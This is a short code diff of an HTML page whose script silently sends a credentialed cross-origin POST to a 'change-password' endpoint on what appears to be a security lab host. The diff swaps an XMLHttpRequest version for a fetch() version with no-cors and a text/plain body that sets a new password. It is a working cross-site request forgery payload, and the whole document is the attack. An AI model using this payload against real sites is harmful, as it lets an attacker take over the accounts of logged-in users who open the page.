@@ -9,19 +9,16 @@
 
 <body>
 
-    <script>
-        var xhttp = new XMLHttpRequest();
-        xhttp.onreadystatechange = function () {
-            if (this.readyState == 4 && this.status == 200) {
-                console.log('ok');
-
-            }
-        }
-
-        xhttp.open("POST", "https://60ntsjhgem.voorivex-lab.online/api/change-password");
-        xhttp.setRequestHeader('Content-type', 'text/plain');
-        xhttp.withCredentials = true;
-        xhttp.send('{"newPassword":"111"}');
+ <script>
+      fetch("https://60ntsjhgem.voorivex-lab.online/api/change-password", {
+        method: "POST",
+        mode: "no-cors",
+        credentials: "include",
+        headers: {
+          "Content-Type": "text/plain"
+        },
+        body: JSON.stringify({ new_password: "mamad3" })
+      });
     </script>
 
 </body>
